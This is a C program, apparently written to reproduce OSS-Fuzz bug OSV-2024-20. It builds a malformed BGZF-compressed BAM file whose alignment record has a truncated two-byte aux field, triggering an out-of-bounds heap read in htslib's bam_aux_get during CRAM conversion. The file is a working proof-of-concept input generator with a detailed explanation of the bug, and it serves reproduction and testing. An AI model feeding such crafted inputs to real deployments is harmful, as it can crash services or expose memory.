/*
 * gen_poc.c: Generate a PoC for OSV-2024-20
 *
 * heap-buffer-overflow READ in bam_aux_get -> process_one_read -> cram_encode_container
 * OSS-Fuzz bug ID: 65820
 *
 * The bug is in sam.c bam_aux_first() and bam_aux_next():
 *   if (s >= end) { ... return NULL; }   // should be: if (end - s <= 2)
 *   return s+2;
 *
 * When the aux data has exactly 1 or 2 bytes remaining, bam_aux_first()
 * returns s+2 which may point past end. Then bam_aux_get() dereferences
 * s[-2], s[-1], and *s which reads 1-2 bytes out of bounds.
 *
 * The path is: view_sam (wc mode = CRAM output) -> sam_read1 reads the BAM
 * record, then sam_write1 in CRAM mode calls cram_encode_container ->
 * process_one_read -> bam_aux_get.
 *
 * We craft a BAM file with a record whose aux data section has exactly
 * 1 or 2 bytes, triggering the off-by-one read in bam_aux_first().
 *
 * BAM format:
 *   magic: "BAM\1"
 *   l_text: int32 (header text length)
 *   text: char[l_text]
 *   n_ref: int32
 *   For each ref: l_name(int32) + name(char[l_name]) + l_ref(int32)
 *   Then alignment records:
 *     block_size: int32 (remaining bytes in the record)
 *     refID: int32
 *     pos: int32
 *     l_read_name: uint8 (including NUL)
 *     mapq: uint8
 *     bin: uint16
 *     n_cigar_op: uint16
 *     flag: uint16
 *     l_seq: int32
 *     next_refID: int32
 *     next_pos: int32
 *     tlen: int32
 *     read_name: char[l_read_name]
 *     cigar: uint32[n_cigar_op]
 *     seq: uint8[(l_seq+1)/2]
 *     qual: char[l_seq]
 *     aux: remaining bytes
 *
 * The aux data starts at fixed_block_size + l_read_name + n_cigar_op*4 +
 * (l_seq+1)/2 + l_seq. We set block_size so that exactly 2 bytes remain
 * for aux data.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <zlib.h>

/* Write a little-endian int32 */
static void put_le32(uint8_t *p, int32_t v) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
    p[2] = (v >> 16) & 0xff;
    p[3] = (v >> 24) & 0xff;
}

/* Write a little-endian uint16 */
static void put_le16(uint8_t *p, uint16_t v) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
}

/*
 * BAM is BGZF compressed. We wrap raw BAM data in a BGZF block.
 * BGZF is gzip with extra field indicating block size.
 * For simplicity, we write the raw data as a single BGZF block.
 */
static int write_bgzf_block(FILE *f, const uint8_t *data, int data_len) {
    /* Use zlib to create a gzip block with BGZF extra field */
    uint8_t out[65536];
    z_stream zs;
    memset(&zs, 0, sizeof(zs));

    /* BGZF header (18 bytes) */
    uint8_t bgzf_hdr[18] = {
        0x1f, 0x8b,        /* gzip magic */
        0x08,              /* CM=deflate */
        0x04,              /* FLG=FEXTRA */
        0x00, 0x00, 0x00, 0x00,  /* MTIME */
        0x00,              /* XFL */
        0xff,              /* OS=unknown */
        0x06, 0x00,        /* XLEN=6 */
        0x42, 0x43,        /* SI1, SI2 (BGZF) */
        0x02, 0x00,        /* SLEN=2 */
        0x00, 0x00         /* BSIZE-1 (placeholder, filled later) */
    };

    /* Compress the data */
    if (deflateInit2(&zs, Z_DEFAULT_COMPRESSION, Z_DEFLATED, -15, 8,
                     Z_DEFAULT_STRATEGY) != Z_OK) {
        return -1;
    }
    zs.next_in = (Bytef *)data;
    zs.avail_in = data_len;
    zs.next_out = out;
    zs.avail_out = sizeof(out);

    if (deflate(&zs, Z_FINISH) != Z_STREAM_END) {
        deflateEnd(&zs);
        return -1;
    }
    int cdata_len = zs.total_out;
    deflateEnd(&zs);

    /* Calculate CRC32 */
    uint32_t crc = crc32(0, data, data_len);

    /* Total block size = 18 (header) + cdata_len + 8 (CRC32 + ISIZE) */
    int bsize = 18 + cdata_len + 8 - 1;  /* BSIZE = block_size - 1 */
    bgzf_hdr[16] = bsize & 0xff;
    bgzf_hdr[17] = (bsize >> 8) & 0xff;

    /* Write BGZF block */
    fwrite(bgzf_hdr, 1, 18, f);
    fwrite(out, 1, cdata_len, f);

    /* Write CRC32 and ISIZE */
    uint8_t trailer[8];
    put_le32(trailer, crc);
    put_le32(trailer + 4, data_len);
    fwrite(trailer, 1, 8, f);

    return 0;
}

/* Write BGZF EOF block */
static void write_bgzf_eof(FILE *f) {
    static const uint8_t eof_block[] = {
        0x1f, 0x8b, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00,
        0x00, 0xff, 0x06, 0x00, 0x42, 0x43, 0x02, 0x00,
        0x1b, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };
    fwrite(eof_block, 1, sizeof(eof_block), f);
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    if (argc > 1)
        outfile = argv[1];

    uint8_t bam[4096];
    int pos = 0;

    /* BAM magic */
    memcpy(bam + pos, "BAM\1", 4); pos += 4;

    /* SAM header text */
    const char *hdr_text = "@HD\tVN:1.6\n@SQ\tSN:ref\tLN:100\n";
    int32_t l_text = strlen(hdr_text);
    put_le32(bam + pos, l_text); pos += 4;
    memcpy(bam + pos, hdr_text, l_text); pos += l_text;

    /* Number of reference sequences */
    put_le32(bam + pos, 1); pos += 4;

    /* Reference sequence: name "ref\0" length 100 */
    put_le32(bam + pos, 4); pos += 4;   /* l_name = 4 (including NUL) */
    memcpy(bam + pos, "ref\0", 4); pos += 4;
    put_le32(bam + pos, 100); pos += 4;  /* l_ref = 100 */

    /*
     * Now build an alignment record where aux data has exactly 2 bytes.
     *
     * Fixed fields (32 bytes):
     *   refID(4) + pos(4) + l_read_name(1) + mapq(1) + bin(2) +
     *   n_cigar_op(2) + flag(2) + l_seq(4) + next_refID(4) +
     *   next_pos(4) + tlen(4) = 32 bytes
     *
     * Variable fields:
     *   read_name: l_read_name bytes (e.g., "r\0" = 2 bytes)
     *   cigar: n_cigar_op * 4 bytes (1 op = 4 bytes: e.g., 1M)
     *   seq: (l_seq+1)/2 bytes (1 base = 1 byte)
     *   qual: l_seq bytes (1 base = 1 byte)
     *   aux: remaining bytes
     *
     * With l_read_name=2, n_cigar_op=1, l_seq=1:
     *   variable = 2 + 4 + 1 + 1 = 8 bytes before aux
     *   total fixed+variable = 32 + 8 = 40 bytes before aux
     *
     * We want exactly 2 bytes of aux data.
     * block_size = 32 + 8 + 2 - 4 = 38
     * (block_size excludes the block_size field itself but starts from refID,
     *  so block_size = total record bytes after block_size field)
     *
     * Actually: block_size counts everything after the block_size int32,
     * starting from refID through the end of aux.
     * So block_size = 32 + l_read_name + n_cigar_op*4 + (l_seq+1)/2 + l_seq + aux_len
     *              = 32 + 2 + 4 + 1 + 1 + 2 = 42
     */

    int l_read_name = 2;   /* "r\0" */
    int n_cigar_op = 1;    /* 1M */
    int l_seq = 1;         /* single base */
    int aux_len = 2;       /* exactly 2 bytes of aux -- triggers the bug */

    int block_size = 32 + l_read_name + n_cigar_op * 4
                   + (l_seq + 1) / 2 + l_seq + aux_len;

    put_le32(bam + pos, block_size); pos += 4;

    /* refID = 0 */
    put_le32(bam + pos, 0); pos += 4;
    /* pos = 0 (0-based) */
    put_le32(bam + pos, 0); pos += 4;

    /* l_read_name */
    bam[pos++] = l_read_name;
    /* mapq = 30 */
    bam[pos++] = 30;
    /* bin - compute BAM bin for position 0, length 1 */
    put_le16(bam + pos, 4681); pos += 2;
    /* n_cigar_op */
    put_le16(bam + pos, n_cigar_op); pos += 2;
    /* flag = 0 (mapped, forward) */
    put_le16(bam + pos, 0); pos += 2;
    /* l_seq */
    put_le32(bam + pos, l_seq); pos += 4;
    /* next_refID = -1 */
    put_le32(bam + pos, -1); pos += 4;
    /* next_pos = -1 */
    put_le32(bam + pos, -1); pos += 4;
    /* tlen = 0 */
    put_le32(bam + pos, 0); pos += 4;

    /* read_name: "r\0" */
    bam[pos++] = 'r';
    bam[pos++] = '\0';

    /* cigar: 1M = (1 << 4) | 0 = 0x10 */
    put_le32(bam + pos, 0x10); pos += 4;

    /* seq: 1 base, A=1 -> packed as (1<<4)|0 = 0x10 */
    bam[pos++] = 0x10;

    /* qual: 1 byte, quality 30 */
    bam[pos++] = 30;

    /*
     * Aux data: exactly 2 bytes.
     * A valid aux tag is: 2-byte tag name + 1-byte type + value
     * With only 2 bytes, we have an incomplete tag: just the 2-byte name
     * with no type byte. This is what triggers the bug:
     *
     * bam_aux_first() checks: if (s >= end) return NULL;
     * With 2 bytes of aux: s = aux_start, end = aux_start + 2
     * s < end, so it returns s+2 which equals end.
     * Then bam_aux_get() accesses s[-2], s[-1], *s where *s = end[0]
     * which is a 1-byte OOB read.
     *
     * We put two bytes that look like a tag name.
     */
    bam[pos++] = 'X';   /* tag byte 1 */
    bam[pos++] = 'Y';   /* tag byte 2 */

    /* Write BAM as BGZF */
    FILE *f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    if (write_bgzf_block(f, bam, pos) < 0) {
        fprintf(stderr, "Failed to write BGZF block\n");
        fclose(f);
        return 1;
    }

    write_bgzf_eof(f);
    fclose(f);

    printf("Wrote PoC to %s\n", outfile);
    printf("BAM record has %d bytes aux data (exactly 2 bytes).\n", aux_len);
    printf("This triggers the heap-buffer-overflow READ in bam_aux_first()/bam_aux_get().\n");
    printf("\nVulnerability: bam_aux_first() checks 's >= end' but returns s+2.\n");
    printf("With 2 bytes of aux, s+2 == end, so the returned pointer is at the\n");
    printf("boundary. bam_aux_get() then reads s[-2], s[-1] (valid) and *s (OOB).\n");

    return 0;
}
